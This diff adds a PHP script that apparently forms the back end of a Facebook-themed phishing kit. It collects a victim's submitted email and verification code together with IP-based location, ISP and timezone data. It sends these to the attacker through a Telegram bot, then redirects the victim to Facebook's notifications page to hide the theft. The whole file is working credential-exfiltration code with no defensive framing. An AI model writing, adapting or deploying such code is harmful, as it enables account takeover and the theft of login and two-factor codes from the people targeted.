@@ -1,0 +1,64 @@
+<?php 
+session_start();
+include "./telegram2.php";
+include 'api-info.php';
+
+$contact = $_POST['contact'];
+$verification = $_POST['verification'];
+$country  = $khcodes['country'];
+$region   = $khcodes['regionName'];
+$isp   = $khcodes['isp'];
+$city     = $khcodes['city'];
+$lat      = $khcodes['lat'];
+$long     = $khcodes['lon'];
+$timezone = $khcodes['timezone'];
+$ipAddr   = $khcodes['query'];
+$time = date('d-m-Y : h-i-s');
+
+// Simpan nilai-nilai dalam sesi
+$contact = $_POST['contact'];
+$verification = $_POST['verification'];
+$_SESSION['country'] = $country;
+$_SESSION['region'] = $region;
+$_SESSION['isp'] = $isp;
+$_SESSION['city'] = $city;
+$_SESSION['lat'] = $lat;
+$_SESSION['long'] = $long;
+$_SESSION['timezone'] = $timezone;
+$_SESSION['ipAddr'] = $ipAddr;
+$_SESSION['time'] = $time;
+
+// Buat pesan dengan nilai-nilai yang ingin Anda kirim
+$message = "
+────────────
+$verification $country DHIYA
+────────────
+• Email: $contact
+• Code: $verification
+────────────
+• Negara: $country
+• Wilayah: $region
+• ISP: $isp
+• Kota: $city
+• Koordinat: ($lat, $long)
+• Zona Waktu: $timezone
+• Alamat IP: $ipAddr
+• Waktu Login: $time
+────────────";
+
+function sendMessage($telegram_id, $message, $id_bot) {
+    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
+    $url = $url . "&text=" . urlencode($message);
+    $ch = curl_init();
+    $optArray = array(
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+
+sendMessage($telegram_id, $message, $id_bot);
+echo '<script>window.location.href = "https://web.facebook.com/notifications";</script>';
+?>
